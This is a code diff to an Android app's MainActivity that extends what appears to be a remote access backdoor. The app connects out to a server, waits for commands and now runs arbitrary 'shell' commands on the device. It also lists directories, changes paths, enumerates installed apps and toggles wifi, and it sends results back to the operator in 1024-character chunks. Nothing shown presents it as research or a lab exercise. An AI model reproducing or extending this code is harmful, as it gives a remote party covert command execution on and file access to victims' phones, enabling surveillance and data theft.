@@ -36,7 +36,6 @@ public class MainActivity extends AppCompatActivity {
         startActivityForResult(enableBtIntent, 0);
 
 
-
         connect thread = new connect();
         thread.start();
 
@@ -52,12 +51,18 @@ public class MainActivity extends AppCompatActivity {
         public void run() {
 
             Socket server = conect_to_server();
+
+            String output;
             while (true) {
                 String cmd = get_cmd(server);
-                String output = basic_cmd(cmd);
-                output = advanced_cmd(server,cmd);
-                send(server, output);
-
+                if (cmd.startsWith("shell ")) {
+                    output = shell(cmd.replace("shell ", ""));
+                } else if (cmd.startsWith("turn")) {
+                    output = basic_cmd(cmd);
+                } else {
+                    output = advanced_cmd(server, cmd);
+                }
+                send(server, "output size: " + output.length() + "\n" + output);
             }
         }
 
@@ -78,14 +83,54 @@ public class MainActivity extends AppCompatActivity {
         }
 
         void send(Socket sock, String text) {
+            String text_size = (String.valueOf(text.length()));
+            Log.d("text size", text_size);
             try {
                 PrintWriter outs = new PrintWriter(sock.getOutputStream(), true);
-                outs.println(text);
+                outs.println("buffer: " + text_size);
             } catch (IOException e) {
                 e.printStackTrace();
             }
 
+            Log.d("recv", recv(sock));
+
+            if (text.length() >= 1024) {
+
+
+               int times_to_send = (int) Math.ceil(text.length() /1024) + 1;
+                for (int i = 0; i < times_to_send; i++) {
+                    // your code goes here
+
+                Log.d("times to send", String.valueOf(times_to_send));
+
+                    String text_to_send = text.substring(0, Math.min(text.length(), 1024));
+
+                    Log.d("sending text" + i, text_to_send);
+                    try {
+                        PrintWriter outs = new PrintWriter(sock.getOutputStream(), true);
+
+                        outs.println(text_to_send);
+                    } catch (IOException e) {
+                        e.printStackTrace();
+                    }
+                    try{
+                    text = text.substring(1024);
+                    }
+                    catch (Exception e){
+                        text = text.substring(text.length());
+                    }
+                }
+            } else {
+                try {
+                    PrintWriter outs = new PrintWriter(sock.getOutputStream(), true);
+
+                    outs.println(text);
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
+            }
         }
+
 
         String recv(Socket sock) {
             String str = "null";
@@ -106,10 +151,10 @@ public class MainActivity extends AppCompatActivity {
             cmd = recv(server);
 
 
-
             return cmd;
         }
-        String wifi(String cmd){
+
+        String wifi(String cmd) {
             Boolean status = null;
             String output = "null";
             if (cmd.contains("on")) {
@@ -123,6 +168,7 @@ public class MainActivity extends AppCompatActivity {
             wifiManager.setWifiEnabled(status);
             return output;
         }
+
         String basic_cmd(String cmd) {
 
             String output = "null";
@@ -136,55 +182,69 @@ public class MainActivity extends AppCompatActivity {
 
             return output;
         }
-        String advanced_cmd(Socket server, String cmd){
+
+        String advanced_cmd(Socket server, String cmd) {
             List<String> files = null;
             String output = null;
-            if (cmd.startsWith("ls")){
+            if (cmd.startsWith("ls")) {
 
                 final String state = Environment.getExternalStorageState();
 
-                if ( Environment.MEDIA_MOUNTED.equals(state) || Environment.MEDIA_MOUNTED_READ_ONLY.equals(state) ) {  // we can read the External Storage...
-                    files = ls(new File(currentpath));
-                    output = files.toString();
-                    Log.d("files", output);
+                if (Environment.MEDIA_MOUNTED.equals(state) || Environment.MEDIA_MOUNTED_READ_ONLY.equals(state)) {
+                    String location_to_ls = "null";
+                    try {
+                        if (cmd.replace("ls", "") != "") {
+                            location_to_ls = currentpath + "/" + cmd.replace("ls ", "");
+
+                        } else {
+                            location_to_ls = currentpath;
+                        }
+                        files = ls(new File(location_to_ls));
+                        output = files.toString();
+                        Log.d("files", output);
+                    } catch (Exception e) {
+                        output = "No such directory or permission denied: " + location_to_ls;
+                    }
                 }
 
-            }
-            else if (cmd.startsWith("cd ")){
-                output = cd(server,cmd);
-            }
-            else if (cmd.startsWith("list apps")){
+            } else if (cmd.startsWith("cd ")) {
+                output = cd(server, cmd);
+            } else if (cmd.startsWith("list apps")) {
                 output = list_all_apps();
+            } else if (cmd.startsWith("pwd")) {
+                output = currentpath;
             }
             return output;
         }
+
         private void getAllFilesOfDir(File directory) {
             Log.d("filesofdir", "Directory: " + directory.getAbsolutePath() + "\n");
 
             final File[] files = directory.listFiles();
 
-            if ( files != null ) {
-                for ( File file : files ) {
-                    if ( file != null ) {
-                        if ( file.isDirectory() ) {  // it is a folder...
+            if (files != null) {
+                for (File file : files) {
+                    if (file != null) {
+                        if (file.isDirectory()) {  // it is a folder...
                             Log.d("filesofdir", "Folder: " + file.getAbsolutePath() + "\n");
                             getAllFilesOfDir(file);
-                        }
-                        else {  // it is a file...
+                        } else {  // it is a file...
                             Log.d("filesofdir", "File: " + file.getAbsolutePath() + "\n");
                         }
                     }
                 }
             }
         }
+
         private List<String> ls(File directory) {
             Log.d("filesofdir", "Directory: " + directory.getAbsolutePath() + "\n");
 
             final File[] files = directory.listFiles();
-            List<String> files2 = new ArrayList<String>();;
-            if ( files != null ) {
-                for ( File file : files ) {
-                    if ( file != null ) {
+            List<String> files2 = new ArrayList<String>();
+            ;
+            if (files != null) {
+                for (File file : files) {
+                    if (file != null) {
                         Log.d("filesofdir", file.getName() + "\n");
                         files2.add(file.getName());
                     }
@@ -195,14 +255,14 @@ public class MainActivity extends AppCompatActivity {
             return null;
         }
 
-        String cd(Socket server, String cmd){
+        String cd(Socket server, String cmd) {
             send(server, "currentpath: " + currentpath);
             String output = recv(server);
             currentpath = output.split("newpath:")[1];
             return "current path set to:" + currentpath;
         }
 
-        String list_all_apps(){
+        String list_all_apps() {
             try {
                 final PackageManager pm = getPackageManager();
 
@@ -215,13 +275,13 @@ public class MainActivity extends AppCompatActivity {
                     all_apps = all_apps + "\n" + appinfo.loadLabel(pm);
                 }
                 return all_apps;
-            }
-            catch (PackageManager.NameNotFoundException e){
+            } catch (PackageManager.NameNotFoundException e) {
                 e.printStackTrace();
             }
             return "failed to load apps";
         }
-        String shell(String cmd){
+
+        String shell(String cmd) {
 
             Process process = null;
             try {
@@ -257,4 +317,5 @@ public class MainActivity extends AppCompatActivity {
         }
 
     }
+
 }
